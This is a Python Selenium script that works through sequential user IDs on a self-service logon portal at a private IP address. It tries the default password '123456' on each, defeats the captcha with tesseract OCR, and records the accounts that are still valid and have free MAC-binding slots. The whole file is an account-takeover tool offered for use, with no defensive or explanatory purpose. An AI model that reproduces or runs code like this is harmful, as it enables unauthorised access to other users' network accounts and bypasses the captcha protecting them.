import os
import time
import requests
import pyautogui
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import UnexpectedAlertPresentException

op = webdriver.Chrome()
URL = 'http://172.16.254.82/selfLogon.do'
num = '0164'
wait = WebDriverWait(op, 10)
name = "JXJJXX"
valiable = list()

def nxt(num):
    res = int(num) + 1
    res = str(res)
    while len(res) < 4:
        res = '0' + res
    return res

def get_captcha():
    act = ActionChains(op)
    act.reset_actions()
    os.system("rm ~/Downloads/*.jpeg")
    print("getting captcha")
    img = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,"img[src=\"/servlet/AuthenCodeImage\"]")))
    act.context_click(img)
    act.perform()
    print("downloading the picture...")
    pyautogui.typewrite(['down', 'down', 'enter'])
    time.sleep(0.5)
    pyautogui.typewrite(['enter'])
    time.sleep(0.5)
    print("tesseracting...")
    os.system("tesseract ~/Downloads/AuthenCodeImage.jpeg res --psm 6")
    time.sleep(0.5)
    print("captcha = " + str(open("res.txt").read()))
    return open("res.txt").read()

def login(num):
    op.find_element_by_name("user_id").send_keys(name + num)
    op.find_element_by_name("passwd").send_keys("123456")
    time.sleep(2)
    op.find_element_by_name("validateCode").send_keys(get_captcha())

def pd(s):
    res = int()
    for i in s:
        if i == ':':
            res += 1
    return res == 2

def work(num):
    try:
        op.get(URL)
    except:
        op.get(URL)
    print("work " + str(num))
    login(num)
    tmpqwq = 1
    not_ok = int()
    # 尝试验证码与密码
    while 1:
        try:
            tmp = wait.until(EC.presence_of_element_located((By.NAME, "mainFrame")))
        except:
            print("wrong")
            login(num)
        else:
            break
        finally:
            tmpqwq += 1
            if tmpqwq == 3:
                not_ok = 1
                break
    if not_ok == 1:
        return 
    op.switch_to.frame(tmp)
    # 获取到期时间
    tmp = op.find_elements(By.CSS_SELECTOR, "td[bgcolor=\"FFFFFF\"][align=\"center\"]")
    have_been = int()
    is_ok = int()
    for e in tmp:
        if pd(e.text):
            print(e.text)
            print(have_been)
            if have_been <= 2:
                have_been += 1
            else:
                year = int(e.text[0 : 4])
                month = int(e.text[5 : 7])
                day = int(e.text[8 : 10])
                nyear = int(time.strftime("%Y", time.localtime()))
                nmonth = int(time.strftime("%m", time.localtime()))
                nday = int(time.strftime("%d", time.localtime()))
                if year < nyear or day < nday or month < nmonth:
                    is_ok = 0
                else:
                    is_ok = 1
    print(is_ok)
    time.sleep(0.5)
    # 判断 MAC 地址
    wait.until(EC.presence_of_element_located((By.LINK_TEXT, "绑定信息"))).click()
    time.sleep(0.5)
    ele = op.find_elements(By.CSS_SELECTOR, "[bgcolor=\"DAE1EF\"]+td")
    ans = int()
    for e in ele:
        _str = e.text
        for s in _str:
            if s == ':':
                ans += 1
    print(str(num) + " = " + str(ans))
    if ans < 15 and is_ok:
        print("True")
        return True
    else:
        return False    
    print(str(num) + " = " + str(ans))

if __name__ == '__main__':
    # 如果不存在 result.txt
    if not os.path.exists("result.txt") or os.path.getsize("result.txt") == 0:
        while 1:
            num = nxt(num)
            if work(num):
                with open("result.txt", 'a') as out:
                    out.write(str(num) + '\n')
            if int(num) > 240:
                break
    else:
        with open("result.txt", 'r') as out:
            for line in out.readlines():
                if not len(line):
                    continue
                valiable.append(line)
        os.remove("result.txt")
        for now in valiable:
            if work(now):
                with open("result.txt", 'a') as out:
                    out.write(now + '\n')
    op.quit()